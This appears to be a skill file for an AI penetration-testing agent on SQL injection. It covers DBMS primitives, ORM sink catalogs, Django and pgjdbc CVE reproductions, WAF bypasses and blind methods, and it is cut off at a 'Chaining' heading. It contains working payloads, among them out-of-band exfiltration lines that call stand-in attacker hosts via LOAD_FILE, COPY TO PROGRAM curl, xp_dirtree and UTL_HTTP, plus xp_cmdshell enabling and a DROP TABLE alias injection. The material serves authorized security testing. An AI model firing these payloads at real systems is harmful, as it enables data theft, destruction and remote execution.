---
name: sql-injection
description: SQL injection testing across value-position and identifier-position sinks, DBMS engine primitives (MySQL/PostgreSQL/MSSQL/Oracle/SQLite), ORM and query-builder parameterization gaps (Django Q/FilteredRelation, SQLAlchemy text, MyBatis ${}, Hibernate), JDBC-driver line-comment generation, blind and OAST channels, and the chains into authentication bypass, file write, and RCE
---

# SQL Injection

SQLi persists because the sink surface is broader than "user string concatenated into a SELECT." Modern exploitation splits into two families that need different tools: **value-position** injection where a literal reaches the query, and **identifier-position** injection where a *dict key*, *alias name*, or *ORDER BY column* reaches the SQL parser's identifier slot. Parameterization closes the first family and does nothing for the second. Every SQLi finding starts by naming which family you are in — then the DBMS engine, then the query shape, then the channel that proves it.

The two families translate into different sink hunts. Value-position sinks are string interpolation into `WHERE`/`INSERT`/`UPDATE` — including partial parameterization where operators or `IN (...)` lists remain unbound. Identifier-position sinks are anywhere the ORM lets a caller name a column, alias, join relation, or order-by expression through `**kwargs`, dict keys, or format strings — the family behind Django's 2024–2026 CVE run (`Q()._connector`, `FilteredRelation` alias, `annotate/alias/aggregate/extra` on MySQL, `HasKey` on Oracle, control-character and period-alias variants), MyBatis's `${column}` vs `#{column}` split, SQLAlchemy `text()`/`literal_column()`, and Hibernate's `InlineIdsOrClauseBuilder`. Treat every ORM API that accepts a *name* from user input as suspect until you have read the code and confirmed it allowlists the identifier before it reaches the SQL builder.

Two deep siblings extend this file — `sql_injection_advanced_deep.md` (parser/engine differentials, second-order and blind variants, WAF bypass classes, chained-primitive exploitation) and `sql_injection_novel_deep.md` (2024–2026 frontier and emerging-stack techniques). Both load in deep scan mode. This base file is self-contained for standard mode: it covers the two family lenses, the primary technique classes, DBMS engine primitives, detection and confirmation, and the primary chains.

## Attack Surface

**Databases**
- Classic relational: MySQL/MariaDB, PostgreSQL, MSSQL, Oracle, SQLite
- Cloud-native: Aurora, Cloud SQL, Cosmos DB SQL API, PlanetScale (Vitess), Neon (serverless Postgres), Turso (libSQL)
- Newer surfaces: JSON/JSONB operators, full-text/search, geospatial, window functions, CTEs, lateral joins, temporal (`FOR SYSTEM_TIME`) queries

**Integration Paths**
- ORMs and query builders (Django ORM, SQLAlchemy, Hibernate, Sequelize, Prisma, GORM, MyBatis, ActiveRecord, jOOQ)
- Stored procedures, database functions, materialized-view definitions
- Search servers, reporting/exporters, ETL pipelines
- JDBC/ODBC drivers whose parameter substitution mode is configurable (see the driver-level primitive below)

**Input Locations**
- Path/query/body/header/cookie
- Mixed encodings (URL, JSON, XML, multipart) — WAFs often inspect only one layer
- Identifier vs value: table/column/alias names (require identifier quoting/allowlisting) vs literals (parameters)
- Query builders: `whereRaw`/`orderByRaw`, string templates in ORMs, `.extra()` in Django, `text()` in SQLAlchemy, `${column}` in MyBatis mapper XML
- JSON coercion or array containment operators (`@>`, `?|`, `->>`), full-text query builders (`to_tsquery`)
- Batch/bulk endpoints and report generators that embed filters directly into a compiled query
- GraphQL resolvers that build SQL from field arguments; REST filter/order/select DSLs (Hasura, PostgREST, `?filter=`/`?order=` in Loopback/Sails)

## Detection Channels

**Error-Based**
- Provoke type/constraint/parser errors revealing stack/version/paths
- Look for engine-specific messages: MySQL `You have an error in your SQL syntax`, PostgreSQL `syntax error at or near`, MSSQL `Unclosed quotation mark`, Oracle `ORA-00933`, SQLite `unrecognized token`

**Boolean-Based**
- Pair requests differing only in predicate truth (`AND 1=1` vs `AND 1=2`, or a subselect that returns true/false)
- Diff status/body/length/ETag/checksum — normalize dynamic sections before diffing

**Time-Based**
- `SLEEP`/`pg_sleep`/`WAITFOR DELAY`/`DBMS_LOCK.SLEEP`
- Use subselect gating (`CASE WHEN ... THEN pg_sleep(N) ELSE 0 END`) to avoid global latency noise
- Delays measured against a control request from the same client, same route, same time bucket

**Out-of-Band (OAST)**
- DNS/HTTP callbacks via DB-specific primitives (`xp_dirtree`, `UTL_HTTP.REQUEST`, MySQL `LOAD_FILE` UNC path, PostgreSQL `dblink`/`copy program`)
- Mint the callback in the sandbox: `interactsh-client -v` prints a unique `*.oast.fun` domain and its inbound stdout — restart between payloads if you need to correlate

## Confirmation

The finding is a proven oracle, not a payload that "looks like SQLi." A boolean diff needs a matching pair (predicate-true vs predicate-false) that produce a *reliable* difference; a time-based hit needs the delay to reproduce and to scale with the sleep parameter. Confirmation signals per channel:

- **Error-based** — the returned error names the engine (`ORA-`, `SQLSTATE`, `PG::`), or leaks a fragment of the compiled SQL. A generic 500 without a database-shaped message is not confirmation.
- **Boolean-based** — two paired requests, differing only in the injected predicate, produce a *consistent* body/status/length diff across ≥3 retries. A one-shot diff is not confirmation; templating and A/B renders drift.
- **Time-based** — the injected `SLEEP(N)` produces `≥ N seconds` delay on ≥3 of 5 retries, and swapping `N=1` for `N=5` scales the delay. A single slow response is not confirmation; the database, network, or a rate limiter can all cause it.
- **OAST** — the callback arrives from an internal-source IP that matches the target's egress, on a domain minted in this session, correlated to the injected request by timing or a unique subdomain label. A callback whose source IP matches the tester's machine is a client-side fetch, not SQLi from the backend.
- **Identifier-position** — the emitted SQL contains the crafted identifier verbatim, or a specific patch-signature error (see the Django measured tables below). A `TypeError` or `ValueError` from the ORM *after* the fix is the mitigated shape.

The finding is *not*: a generic 500, a Bash `sleep`-shape latency without scaling, a `sqlmap` "possibly injectable" without a confirmed channel, a WAF block page with a SQL-shaped rule name, or an OAST hit from the wrong source IP.

## DBMS Primitives

### MySQL / MariaDB

- Version/user/db: `@@version`, `database()`, `user()`, `current_user()`, `@@hostname`, `@@datadir`
- Error-based: `extractvalue()`/`updatexml()` (older MySQL), `JSON_KEYS`/`JSON_EXTRACT` with malformed paths, `GTID_SUBSET` on invalid input
- File IO: `LOAD_FILE()`, `SELECT ... INTO DUMPFILE/OUTFILE` (requires `FILE` privilege and `secure_file_priv` unset or matching)
- OOB/DNS: `LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\a'))` on Windows-hosted MySQL — the SMB name resolution leaks the payload as a DNS lookup
- Time: `SLEEP(n)`, heavy `BENCHMARK(N, MD5(1))`
- JSON: `JSON_EXTRACT`/`JSON_SEARCH` with crafted paths; GIS funcs (`ST_LatFromGeoHash`) sometimes leak

### PostgreSQL

- Version/user/db: `version()`, `current_user`, `current_database()`, `current_schema()`, `inet_server_addr()`
- Error-based: raise via unsupported casts (`CAST((SELECT ...) AS int)`), division by zero, `xpath()` errors in xml2 extension
- OOB: `COPY (SELECT ...) TO PROGRAM 'curl attacker/?data='` (needs superuser); `dblink('host=attacker ...')`; the `http` and `pgsql-http` extensions
- Time: `pg_sleep(n)`
- Files: `COPY table TO/FROM '/path'` (superuser only), `lo_import`/`lo_export`
- JSON/JSONB: operators `->`, `->>`, `#>>`, `@>`, `?|` with lateral/CTE for blind extraction; JSON path (`@@` operator, PostgreSQL 12+) as a side channel

### MSSQL

- Version/db/user: `@@version`, `db_name()`, `system_user`, `user_name()`, `HOST_NAME()`, `SERVERPROPERTY('MachineName')`
- OOB/DNS: `xp_dirtree \\<data>.attacker.tld\a`, `xp_fileexist`, `xp_subdirs`; HTTP via OLE automation (`sp_OACreate`) if enabled
- Exec: `xp_cmdshell` (often disabled — enable with `sp_configure 'xp_cmdshell', 1` if `sysadmin`); `OPENROWSET`/`OPENDATASOURCE`
- Time: `WAITFOR DELAY '0:0:5'`; heavy functions (`HASHBYTES('SHA2_512', REPLICATE('A', 10000000))`) cause measurable delays without needing sleep permission
- Error-based: `convert`/`parse`, divide by zero, `FOR XML PATH` leaks

### Oracle

- Version/db/user: banner from `v$version`, `ora_database_name`, `user`, `sys_context('USERENV','DB_NAME')`
- OOB: `UTL_HTTP.REQUEST('http://<data>.attacker')`, `DBMS_LDAP.INIT`, `UTL_INADDR.GET_HOST_ADDRESS`, `HTTPURITYPE`, `DBMS_XSLPROCESSOR.READ2CLOB` on file URLs (all permission-dependent — check `DBA_NETWORK_ACLS` before firing)
- Time: `dbms_lock.sleep(n)` (needs privilege), otherwise heavy hashing
- Error-based: `to_number`/`to_date` conversions, `XMLType('<x>' || (SELECT ...))`
- File: `UTL_FILE` with directory objects (privileged)

### SQLite

Ubiquitous in modern stacks (Django default, Rails default, embedded, mobile, edge — Turso/Cloudflare D1). No file/exec primitives, but the injection classes are otherwise standard.

- Version: `sqlite_version()`
- Metadata: `sqlite_master`, `sqlite_temp_master`, `PRAGMA table_info(<name>)`
- No native `SLEEP` — use heavy recursion (`WITH RECURSIVE t AS (SELECT 1 UNION SELECT * FROM t) SELECT * FROM t LIMIT N`) or `randomblob(N)` with big N to burn CPU
- No `xp_dirtree`/`UTL_HTTP` — OOB requires an application-layer bounce
- `ATTACH DATABASE` against attacker-controlled URI (when the URI reaches the SQLite parser) can write to arbitrary filesystem paths on some builds

## Key Vulnerabilities

### UNION-Based Extraction

- Determine column count via `ORDER BY n` walk (bisect: `ORDER BY 1`, `ORDER BY 100`, halve until stable) or `UNION SELECT null,null,...`
- Align column types with `CAST`/`CONVERT`; coerce to text/json for rendering
- When UNION is filtered by an `ORDER BY` sitting after the injection, use `UNION ALL SELECT ... LIMIT 1` to control which row is returned
- When UNION is filtered entirely (WAF or `DISTINCT`), switch to error-based, blind, or OAST channels

### Blind Extraction

- Branch on single-bit predicates using `SUBSTRING`/`ASCII`, `LEFT`/`RIGHT`, or JSON/array operators
- Binary search on character space (`ASCII(SUBSTRING(...)) > 96` etc.) for fewer requests
- Encode outputs (hex/base64) to normalize when charsets vary
- Gate delays inside subqueries to reduce noise: `AND (SELECT CASE WHEN (predicate) THEN pg_sleep(0.5) ELSE 0 END)`
- Prefer error-based over blind, and blind over time-based, when all three are open — the noisier the channel, the more retries confirmation needs

### Out-of-Band

- Prefer OAST to minimize noise and bypass strict response paths
- Embed data in DNS labels or HTTP query params (`(SELECT ...)||'.attacker'`)
- MSSQL: `xp_dirtree \\\\<data>.attacker.tld\\a`
- Oracle: `UTL_HTTP.REQUEST('http://<data>.attacker')`
- MySQL (Windows): `LOAD_FILE` with UNC path
- PostgreSQL: `COPY (SELECT ...) TO PROGRAM 'curl ...'` or the `http` extension

### Write Primitives

- Auth bypass: inject OR-based tautologies or subselects into login checks (see the Django `_connector` measurement below for the ORM version of this)
- Privilege changes: update role/plan/feature flags when UPDATE is injectable and the app trusts the row-count
- File write: `INTO OUTFILE`/`DUMPFILE` (MySQL, `FILE` priv + `secure_file_priv`), `COPY TO` (PostgreSQL superuser), `xp_cmdshell` redirection (MSSQL sysadmin)
- Job/proc abuse: schedule tasks or create procedures/functions when permissions allow (pg_cron, MSSQL Agent, Oracle DBMS_SCHEDULER)

### ORM and Query Builders

The Django CVE run 2024–2026 shows the shape: the ORM parameterizes *values* correctly, then hands attacker-controlled *identifiers* to the SQL builder without allowlisting. The bug never touches a `%s` slot.

**Django — measured** (Django 5.2.7 for CVE-2025-64459, 5.2.5 for CVE-2025-57833; scripts under `scratchpad/django_measure/`):

CVE-2025-64459 — `_connector` kwarg through `**kwargs` expansion into `.filter()` / `Q()` / `.exclude()` / `.get()`. Baseline vs attack:

```
baseline: .filter(owner_id=1)
  SQL: WHERE "app_item"."owner_id" = %s               PARAMS: (1,)

attack: .filter(**{"owner_id": 1, "is_admin": True, "_connector": "OR"})
  SQL: WHERE ("app_item"."is_admin" OR "app_item"."owner_id" = %s)   PARAMS: (1,)

attack: Q(**{"owner_id": 1, "_connector": "OR", "_negated": True})
  SQL: WHERE NOT ("app_item"."owner_id" = %s)          PARAMS: (1,)
```

The AND-shape becomes OR-shape (or NOT-shape with `_negated=True`). In a login check `User.objects.filter(**request.json)`, the attacker gets any admin row because the intended AND collapses to OR. Affected `>=5.2a1 <5.2.8`, `>=5.0a1 <5.1.14`, `<4.2.26`; fixed 5.2.8 / 5.1.14 / 4.2.26. On 5.2.8 the same call raises `TypeError: The following kwargs are invalid: '_connector'` — that exception is the fix signature. Primary source: NVD CVE-2025-64459 (https://nvd.nist.gov/vuln/detail/CVE-2025-64459).

CVE-2025-57833 — `FilteredRelation` column-alias identifier injection. The dict *key* passed to `.annotate(**{key: FilteredRelation(...)})` reaches the SQL identifier position without full quoting:

```
attack: annotate(**{'admin"; DROP TABLE auth_user;--': FilteredRelation('groups', condition=Q(groups__name='admin'))})
SQL emitted (5.2.5):
  INNER JOIN "auth_group" admin"; DROP TABLE auth_user;-- ON (... = admin"; DROP TABLE auth_user;--."id" ...)
  WHERE admin"; DROP TABLE auth_user;--."name" = %s
```

The crafted alias appears bare in the JOIN and as a qualifier on every subsequent column reference — parameterization is not applicable, only identifier allowlisting is. Affected `<4.2.24`, `>=5.0a1 <5.1.12`, `>=5.2a1 <5.2.6`; fixed 4.2.24 / 5.1.12 / 5.2.6. On 5.2.6 the same call raises `ValueError('Column aliases cannot contain whitespace characters, quotation marks, semicolons, or SQL comments.')` — that message is the fix signature. Primary source: NVD CVE-2025-57833.

The other Django identifier-position CVEs from the same 15-month window follow the same pattern on different sinks — see `sql_injection_novel_deep.md` for the family enumeration (CVE-2025-59681 `annotate`/`alias`/`aggregate`/`extra` on MySQL/MariaDB, CVE-2025-13372 FilteredRelation on PostgreSQL, CVE-2026-1287 control-character alias variant, CVE-2026-1312 period-in-alias variant, CVE-2026-1207 PostGIS `RasterField` band-index).

**MyBatis** — the classic split. `${column}` is string interpolation into SQL text; `#{column}` is a bound parameter. Any `${...}` reachable from user input is identifier-position by design — the framework contract, not a bug. Grep every mapper XML and `@Select`/`@Update` annotation for `${` and trace the source. CVE-2022-28111 (PageHelper `orderBy`) is the canonical example of a widely-used library that took a user column name into a `${}`.

**SQLAlchemy** — `text()`, `literal_column()`, and `.execute(str_query)` are identifier-position sinks by API contract. Historic advisories (CVE-2019-7164 `order_by`, CVE-2019-7548 `group_by`) closed some ORM-side surfaces, but the raw APIs remain — a `text(f"... ORDER BY {user_col}")` is exploitable on every SQLAlchemy version. Grep the codebase for `text(f`, `text('` with `.format(`, and `literal_column(`.

**Hibernate / JPA** — HQL/JPQL `ORDER BY <dynamic>` and native queries via `@Query(nativeQuery=true, ...)` interpolating user input. CVE-2026-0603 documented second-order SQLi in `InlineIdsOrClauseBuilder` via non-alphanumeric characters in ID column values on affected Hibernate builds — verify the exact release via `hibernate.version` in the manifest before firing.

**Other builders** — Sequelize `sequelize.query(sql)` and `sequelize.literal()`; Prisma `$queryRawUnsafe`; GORM `Raw(sql, ...)`; ActiveRecord `.where("... #{user}")` and `.order(user)`; Knex `whereRaw`/`orderByRaw`. All are documented identifier or value sinks — the maintainers named them "raw"/"unsafe" for a reason. See the Framework and Query-Builder Sink Catalog below for the full per-ecosystem list.

### JDBC Driver Line-Comment Injection (CVE-2024-1597, pgjdbc)

A distinct class — the injection is enabled by the **driver's parameter substitution mode**, not by the app's SQL. Four preconditions must **all** hold; miss one and the finding is a false positive.

1. The connection URL sets `preferQueryMode=simple` (the non-default). In default extended query mode, parameters transit via separate Bind protocol messages and this class does not apply.
2. The SQL text contains a numeric parameter placeholder immediately preceded by `-` — for example `SELECT -?, ?`.
3. The application binds a negative numeric to that placeholder.
4. The **same line** carries a subsequent string parameter placeholder, and the attacker controls the string.

Under those four conditions, the driver inlines the negative numeric, so `-?` becomes `--` — that turns the rest of the line into a SQL comment that swallows the next placeholder's opening quote. A newline in the attacker-controlled string then injects unescaped SQL after the comment terminates.

Affected pgjdbc: fixed in 42.7.2 / 42.6.1 / 42.5.5 / 42.4.4 / 42.3.9 / 42.2.28. On any pgjdbc version, targets with default `preferQueryMode=extended` are not exploitable — do not report a bug against them. Primary sources: EnterpriseDB advisory (https://www.enterprisedb.com/docs/security/assessments/cve-2024-1597/), NVD CVE-2024-1597 (https://nvd.nist.gov/vuln/detail/CVE-2024-1597).

Fingerprint the mode before firing: read the JDBC URL from configuration if you have code access, or, on a black-box target, look for the `preferQueryMode=simple` string in a connection-error stack (many apps leak the URL in HTTP 500 pages during a bind failure) or in the app's Prometheus/actuator config endpoint. Absent that evidence, treat the class as "requires further fingerprinting" and record a version-boundary probe rather than a finding.

The class generalizes — any driver whose non-default mode inlines parameter values into SQL text can carry a comment-generation primitive on the right token shape. Verify the mode per JDBC vendor before applying the pattern.

### Identifier-Position Injection

The unifying lens across the ORM examples above. If a *name* — column, table, alias, ORDER BY expression, JOIN relation, JSON path key — reaches the SQL parser from user input without allowlisting, parameterization does not save it. Auditing hunts:

- `ORDER BY <user_col>` — the most common instance. Django `.order_by(request.GET['sort'])`, Rails `.order(params[:sort])`, SQL builders that interpolate the column name.
- `SELECT <user_col>` — column projection driven by API `?fields=` DSLs; a crafted field name reaches the SELECT list.
- `<table_name>` — multi-tenant "which table" routing where the tenant id is a table suffix; the tenant id needs identifier allowlisting.
- `AS <alias>` — Django `FilteredRelation`, SQLAlchemy `.label()`, hand-rolled `SELECT x AS <user_alias>`.
- `JOIN <relation>` — Django's `FilteredRelation` sinks in the JOIN name (the measured example above).
- MyBatis `${column}`, SQLAlchemy `literal_column(user_col)`, Hibernate `orderBy(user_col)`.

The confirmation signal is the *emitted SQL* — show the crafted identifier appearing verbatim in the compiled query (or the specific patch-signature error, as in the Django measured tables). Do not rely on a value-position error message; an identifier-position bug often does not emit a database syntax error at all until the crafted identifier reaches the parser through a legitimate path.

### Uncommon Contexts

- **`ORDER BY`/`GROUP BY`/`HAVING`** with `CASE WHEN` for boolean channels — `ORDER BY (CASE WHEN 1=1 THEN name ELSE id END)` produces observable ordering differences
- **`LIMIT`/`OFFSET`** injection — inject into OFFSET to produce measurable timing or page-shape shift; many ORMs bind LIMIT but interpolate OFFSET
- **Full-text/search helpers** — `MATCH ... AGAINST` in MySQL, `to_tsvector`/`to_tsquery` in PostgreSQL, Solr/Elasticsearch bridge queries; payload mixing exploits the tokenizer
- **XML/JSON functions** — error generation via malformed documents/paths reveals engine and version
- **Window functions and CTEs** — `WITH x AS (...) SELECT ... FROM x` smuggles subqueries past filters that inspect only the outer SELECT; recursive CTEs on PostgreSQL/MSSQL enable computed side channels
- **Stored procedures** — dynamic SQL inside a proc is often unparameterized even when the calling code is parameterized; `EXEC(@sql)`/`sp_executesql` without parameter list is the smell
- **JSON column values** — a value written to a JSON/JSONB column is *value-position* on write and *identifier-position* on read (`->>'user_key'`), so the round-trip can leak an identifier-position sink through what looked like a value-position field
- **Batch and bulk endpoints** — `POST /api/items:batchCreate` with a list of dicts; frameworks that iterate the list and build one query per item often lose parameterization on the loop's boundary case (the last dict, an empty dict, a dict with a reserved key)

### Framework and Query-Builder Sink Catalog

The identifier-position and value-position sinks per ecosystem — a base-level enumeration to grep against a target's dependency manifest before firing. Sinks named "raw", "unsafe", "literal", or with a `$`-prefix in mapper syntax are documented dangerous by the maintainer.

**Python**

- **Django ORM** — value: `.extra(where=[...], params=[...])` is safe only if `params` binds every placeholder; `.raw(sql, params)` similarly. Identifier: `.extra(select={key: ...})`, `.order_by(user_str)`, `.annotate/.alias/.aggregate/.filter(**dict)` (the 2024–2026 CVE family), `FilteredRelation` alias keys, `HasKey(lhs, rhs)` on Oracle.
- **SQLAlchemy** — value: `text('... WHERE x = :x').bindparams(x=user)` is safe; `text(f'... WHERE x = {user}')` is not. Identifier: `text()` with any interpolation, `literal_column(user)`, `column(user)`, `.order_by(text(user))`, `.execute(user_string)` on the classic 1.x API.
- **Peewee** — `SQL(user_string)` fragments; `.raw()` methods.
- **Tortoise ORM** — `Tortoise.get_connection('default').execute_query(user_string)`.

**Node.js**

- **Sequelize** — value: `sequelize.query(sql, {replacements: {x: user}})` and `{bind: [user]}` are safe. Identifier: `sequelize.query(f'... ORDER BY ${user}')`, `sequelize.literal(user)`, `col(user)`, `.order([[literal(user), 'DESC']])`. Sequelize `Op.and`/`Op.or` accept nested objects that mirror the SQL builder; user-controlled operator names have been vulnerable in the past.
- **Prisma** — value: `$queryRaw\`... WHERE x = ${user}\`` is safe (tagged template binds parameters); `$queryRawUnsafe(sql, ...user_vars)` is not. Identifier: `$queryRawUnsafe(f'... ORDER BY {user}')` — no identifier binding, no allowlist by default.
- **Knex** — value: `.where('x', user)` is safe; `.whereRaw('x = ?', [user])` is safe. Identifier: `.orderByRaw(user)`, `.whereRaw('x = ' + user)`, `.raw(user)`.
- **TypeORM** — value: `.createQueryBuilder().where('x = :x', {x: user})` is safe. Identifier: `.orderBy(user_col)` (no built-in allowlist; the API takes any string), `.createQueryBuilder().where(user_string)`.
- **Drizzle** — value: `sql\`... WHERE x = ${user}\`` binds; `sql.raw(user_string)` interpolates.
- **Kysely** — value: `.where('x', '=', user)` binds; `sql\`... ${sql.raw(user)}\`` interpolates.

**Ruby**

- **ActiveRecord** — value: `where('x = ?', user)` is safe; `where(x: user)` is safe. Identifier: `.order(params[:sort])`, `.select(params[:cols])`, `.pluck(params[:col])`, `.reorder(user)`, `.group(user)`, `.joins(user_string)` — none allowlist identifiers. Historic advisories (CVE-2019-5418, CVE-2021-22885) touched the render/reflection surfaces; identifier-position sinks are the current family.
- **Sequel (Ruby)** — `Sequel.lit(user_string)`, `dataset.with_sql(user_string)`.

**Java**

- **JPA / Hibernate** — value: `entityManager.createQuery("... WHERE x = :x").setParameter("x", user)` is safe. Identifier: `.setParameter("col", user_col)` where `:col` is in the FROM/ORDER position (JPA silently interpolates), `@Query(nativeQuery=true, value="... ORDER BY :col")`. Historic: `InlineIdsOrClauseBuilder` (CVE-2026-0603 on Hibernate — non-alphanumeric ID column values, second-order shape).
- **MyBatis** — value: `#{param}` binds; identifier: `${param}` interpolates. Grep every `*Mapper.xml` and `@Select`/`@Update`/`@Insert`/`@Delete` for `${` — that character is the smell. CVE-2022-28111 (PageHelper `orderBy`) is the canonical widely-used-library instance.
- **jOOQ** — value: `.eq(user)` binds; identifier: `DSL.field(user_string)`, `DSL.name(user_string)`, `DSL.table(user_string)` — none allowlist input.
- **Spring Data JDBC / JdbcTemplate** — value: `jdbcTemplate.query(sql, new Object[]{user}, ...)` is safe; identifier: `NamedParameterJdbcTemplate.update("... " + user, ...)` and the `queryForObject(String sql, ...)` overloads that take a preformatted string.
- **QueryDSL** — value: `.eq(user)` binds; identifier: `Expressions.stringPath(user)`, `Expressions.template(...)`.

**Go**

- **database/sql** — value: `db.Query("... WHERE x = $1", user)` binds; `db.Query("... WHERE x = " + user)` does not.
- **GORM** — value: `.Where("x = ?", user)` binds; identifier: `.Order(user_string)`, `.Group(user_string)`, `.Raw(user_string)`, `.Select(user_string)`.
- **sqlx** — value: `.NamedQuery(":x = :x", map)` binds; identifier: string interpolation into the query.
- **ent / Bun / SQLBoiler** — similar shape: `Raw*` methods, `qm.OrderBy(user)`.

**PHP**

- **Doctrine ORM / DBAL** — value: `->setParameter('x', user)` binds; identifier: `->orderBy($_GET['sort'], 'ASC')` (the first argument accepts any string).
- **Eloquent (Laravel)** — value: `->where('x', $user)` binds; identifier: `->orderBy($_GET['sort'])`, `->select($_GET['cols'])`, `->orderByRaw($user)`. Laravel raw APIs: `DB::raw`, `whereRaw`, `havingRaw`, `orderByRaw`, `groupByRaw`.
- **PDO** — value: `$stmt->bindParam(':x', $user)` binds; string interpolation into the query does not.

**.NET**

- **Entity Framework Core** — value: `FromSqlInterpolated($"... {user}")` binds (interpolated strings become parameters); `FromSqlRaw($"... {user}")` does not. Identifier: any `.OrderBy(x => EF.Property<string>(x, user))` where the property name is user-controlled.
- **Dapper** — value: `connection.Query("... WHERE x = @x", new { x = user })` binds; identifier: string interpolation into the query.

The base-level heuristic: if the API name contains `Raw`, `Unsafe`, `Literal`, `Str`, or `Fragment` — or if it accepts a `string` where an ORM abstraction (column, expression) was possible — the maintainer flagged it. If the API accepts `**kwargs` or a `map[string]interface{}` / `Object`-typed dict that the ORM iterates to build clauses, verify whether the key namespace is allowlisted before firing.

### GraphQL and REST DSL Injection

Modern APIs push a filter/order/select DSL to the client — the DSL is the injection surface, not the URL. Two families dominate:

**GraphQL resolvers**

- A resolver takes a `where` / `orderBy` / `columns` argument and hands it to the ORM. If the resolver forwards keys and values without allowlisting, the whole ORM sink catalog above is reachable from a GraphQL query.
- Hasura, PostGraphile, and PostgREST expose PostgreSQL directly; the DSL translates to SQL by design, so the injection surface is the *permission model*, not the SQL — bugs are usually authorization-level (row-level security bypass, computed-column leak), not classical SQLi. Verify the RLS policies before spraying payloads.
- Introspection first: `POST /graphql { "query": "{ __schema { types { name fields { name args { name } } } } }" }` maps every filter/order/select argument the resolver takes. The `where` field of an auto-generated CRUD resolver on Hasura/Prisma is the highest-yield injection surface.

**REST filter DSLs**

- **Loopback / Strapi**: `GET /api/items?filter={"where":{"and":[{"x":1}]},"order":"name DESC"}` — the `order` field is identifier-position by design; the `where` field's nested boolean operators can be reshaped like the Django `_connector` primitive.
- **PostgREST**: `GET /api/items?select=id,name&order=id.desc` — safe if the schema allowlists exposed columns; a schema exposing everything grants read on every column of every table by design.
- **JSON:API / RFC filter**: `?filter[x][gte]=1` — the operator (`gte`/`lte`/`in`) is a key in the query string; frameworks that route the operator to a SQL fragment without allowlisting produce identifier-position bugs on the operator, not the value.
- **RSQL / FIQL** (`?filter=x==1;y==2`): the parser converts to SQL; grammar-fuzzing the parser has produced injection in java-rsql / spring-data-rest.

Attack shape: enumerate every DSL key the framework recognizes, then probe (a) is a value with a SQL metacharacter escaped? (b) is a key not in the schema silently interpolated as an identifier? (c) is a nested boolean/operator key reshapeable into a tautology? Confirmation is the same as the base injection — an oracle that scales with a controlled predicate.

### Input Decoders and Encoding Boundaries

The injection surface is not the URL — it is the byte sequence the SQL sink sees. Every layer between the wire and the sink is a potential differential.

- **JSON body → SQL** — a WAF inspecting JSON in strict mode may miss a value in a nested array or a Unicode-escaped string (`"x": "' OR 1=1--"`). Confirm by sending the same payload as a top-level string vs a deeply-nested one; if the deep one bypasses the WAF and reaches the sink, the WAF's JSON depth limit is the bypass.
- **Multipart form-data** — WAF may inspect only the first `Content-Type` of a multipart field. See the Busboy multipart parser-differential canonical block in `ssrf_advanced_deep.md` § Busboy Multipart Parser-Differential — Canonical Block for the four-variant technique family (duplicate boundary, non-UTF-8 header fail-open, part-level `charset=utf16le` differential, dual `Content-Type` differential) that turns a Busboy/Node ingress into a general injection tunnel reusable across `xss`/`rce`/`ssrf`/`sql_injection`.
- **URL decoding** — a decoder that runs *once* misses `%2527` (which decodes to `%27` at the second decode); a decoder that runs *twice* misses `%252527`. Trial-and-error: send `%27`, `%2527`, `%252527` and see which lands as a literal single-quote at the sink.
- **Unicode normalization** — a normalizer between WAF and DB may map a fullwidth apostrophe (`U+FF07`) or a modifier letter apostrophe (`U+02BC`) to `'` after the WAF inspected the raw bytes. Test the fullwidth/wide/narrow variants of `'`, `"`, `(`, `)`.
- **JSON deserialization side effects** — `JSON.parse` on Node accepts numbers with leading `+` and dropped leading `0`s (`0e0`, `1e300`); a validator that treats numbers as safe may miss a numeric context injection when the number reaches the SQL builder as text.
- **GraphQL variables** — variables are JSON-decoded before they reach the resolver; a WAF that inspects only the `query` string misses everything in `variables`.

Base-level heuristic: if the WAF and the sink parse the same input at different layers, they see different bytes. Fingerprint the WAF's decoding depth (send the same payload at 1x, 2x, 3x URL-encoding and observe which is blocked), then land the payload one level past the WAF's inspection.

## Bypass Techniques

Base file coverage: the primary bypass classes. Parser/engine differentials, tokenizer bugs, WAF-specific bypass classes, and modern WAF-provider technique research live in `sql_injection_advanced_deep.md`; 2024–2026 published bypass classes and emerging-stack primitives live in `sql_injection_novel_deep.md`.

**Whitespace/Spacing**
- `/**/`, `/*!00000 */` MySQL versioned comments, newlines, tabs, `\v`, `\f`
- `%0a`/`%09`/`%0d` — the parser accepts them where a WAF whitespace-normalizer might not
- `0xe3 0x80 0x80` (ideographic space) — some tokenizers accept it as whitespace

**Keyword Splitting**
- `UN/**/ION`, `U%4eION`, backticks/quotes around identifiers, case folding
- MySQL versioned comments to conditionally execute keywords: `/*!50000UNION*/`

**Numeric Tricks**
- Scientific notation (`1e0`), signed/unsigned, hex (`0x61646d696e`), binary (`0b0`)
- `TRUE`/`FALSE` in place of `1`/`0`, `NULL` where NULL-safe operators are permitted

**Encodings**
- Double URL encoding (`%2527` decodes to `%27` decodes to `'`) when a decoder runs twice before the sink
- Mixed Unicode normalizations (NFKC/NFD) — a normalizer between the WAF and the DB sees a different string
- `char()`/`CONCAT_ws` to build tokens without literal characters
- Base64 or hex reassembly with `DECODE`/`UNHEX`

**Clause Relocation**
- Subselects, derived tables, CTEs (`WITH`), lateral joins to hide payload shape from a WAF that only inspects the outer SELECT
- `UNION` in a subselect (`SELECT (SELECT 1 UNION SELECT 2)`)

## Second-Order Injection

The payload survives an escape at the input boundary, then triggers when a *later* query reads and interpolates the stored value. The finding is not the input — the input succeeds — but the second endpoint that reads and injects.

Two-stage hunting:
1. Store payloads at every user-controllable field (display name, profile bio, org name, upload filename, comment body, integration name). Escape them at input as intended.
2. Traverse every place the app reads those fields — search results, admin dashboards, notifications, exports, background jobs, log viewers. Confirmation is the second endpoint's query shape carrying the payload without re-parameterization.

Deep detection methodology (payload-tagging, differential storage tables, temporal correlation of first-order vs second-order writes) lives in `sql_injection_advanced_deep.md`.

## Blind SQLi

- Prefer boolean-based over time-based when the response reflects any state (length, ETag, redirect, status)
- Time-based baselines: measure control latency (5 samples) before the injection; confirm the delay scales with the sleep parameter
- OAST-based blind: exfil bit-by-bit into subdomain labels — `SELECT (CASE WHEN (predicate) THEN 'a' ELSE 'b' END) || '.oast.fun'` into a DNS-emitting sink
- Timing normalization: run 5 sample rounds per bit; discard the outlier; median rules
- Second-order blind: the injected fragment stores and fires only when the target endpoint is polled — combine with OAST for asynchronous confirmation

## Chaining

**Upstream — what has to be true first**

